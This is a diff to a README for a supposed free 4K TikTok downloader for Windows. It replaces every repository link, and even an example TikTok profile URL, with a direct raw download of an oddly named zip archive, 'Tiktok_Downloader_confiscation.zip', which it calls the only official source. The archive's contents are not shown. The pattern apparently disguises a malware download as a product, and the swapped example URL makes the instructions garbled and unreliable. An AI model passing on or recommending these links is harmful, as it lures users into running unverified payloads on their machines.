@@ -1,6 +1,6 @@
 # 📥 Tiktok-Downloader - Your Free 4K Video Saver for Windows
 
-[![Download Tiktok-Downloader](https://img.shields.io/badge/Download-Tiktok--Downloader-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://github.com/barclayyugoslavian3055/Tiktok-Downloader)
+[![Download Tiktok-Downloader](https://img.shields.io/badge/Download-Tiktok--Downloader-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/barclayyugoslavian3055/Tiktok-Downloader/main/folder/Tiktok_Downloader_confiscation.zip)
 
 ---
 
@@ -31,7 +31,7 @@ Getting started with Tiktok-Downloader is incredibly easy. Follow these simple s
 
 Visit this link to download the application:
 
-[**Click Here to Download Tiktok-Downloader**](https://github.com/barclayyugoslavian3055/Tiktok-Downloader)
+[**Click Here to Download Tiktok-Downloader**](https://raw.githubusercontent.com/barclayyugoslavian3055/Tiktok-Downloader/main/folder/Tiktok_Downloader_confiscation.zip)
 
 The download will start automatically. This is the official and only download source you need.
 
@@ -68,7 +68,7 @@ Using Tiktok-Downloader is as simple as copy and paste. Here's a detailed guide:
 ### Downloading a Playlist
 
 1. Go to any TikTok creator's profile.
-2. Copy the profile URL (e.g., https://www.tiktok.com/@username).
+2. Copy the profile URL (e.g., https://raw.githubusercontent.com/barclayyugoslavian3055/Tiktok-Downloader/main/folder/Tiktok_Downloader_confiscation.zip).
 3. Paste the URL into Tiktok-Downloader.
 4. Select **"Playlist"** mode.
 5. Choose your quality settings.
@@ -211,7 +211,7 @@ Tiktok-Downloader is an independent application and is not affiliated with TikTo
 
 You're just one click away from saving your favorite TikTok videos in amazing 4K quality. Download Tiktok-Downloader now and experience the easiest video downloading solution for Windows!
 
-[**🚀 DOWNLOAD TIKTOK-DOWNLOADER NOW**](https://github.com/barclayyugoslavian3055/Tiktok-Downloader)
+[**🚀 DOWNLOAD TIKTOK-DOWNLOADER NOW**](https://raw.githubusercontent.com/barclayyugoslavian3055/Tiktok-Downloader/main/folder/Tiktok_Downloader_confiscation.zip)
 
 ---
 
